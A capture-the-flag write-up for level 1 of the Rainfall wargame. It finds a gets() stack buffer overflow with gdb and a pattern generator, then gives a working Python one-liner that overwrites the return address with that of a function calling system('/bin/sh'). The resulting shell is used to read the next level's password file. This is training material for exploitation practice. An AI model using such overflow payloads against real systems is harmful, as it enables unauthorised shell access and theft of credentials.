# Rainfall - Level 1


## Executable analyse
```assembly
(gdb) info functions

0x08048444  run
0x08048480  main
```

They are two functions in this program :

- The main function read from stdin by calling `gets` function
- The run function execute `/bin/sh` by calling `system` function

## The vulnerability
```assembly
0x08048472 <+46>:	movl   $0x8048584,(%esp)
0x08048479 <+53>:	call   0x8048360 <system@plt>
````

By calling `gets`, the main function is vulnerable to a **buffer overflow attack** :  
By using a ["pattern generator"](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) tool, we will try to exploit the stack and call the `run` function.


By running the command  

```assembly
(gdb) info register

eip            0x63413563	0x63413563
```
With this pattern we can deduce $eip start at 76th of gets buffer

With the command : 

```bash
(python -c "print 'A' * 76 + b'\x08\x04\x84\x44'[::-1]"; cat) | ./level1
```

Abracadabra a shell is opened as level2 user!
```bash
$> cat /home/user/level2/.pass
```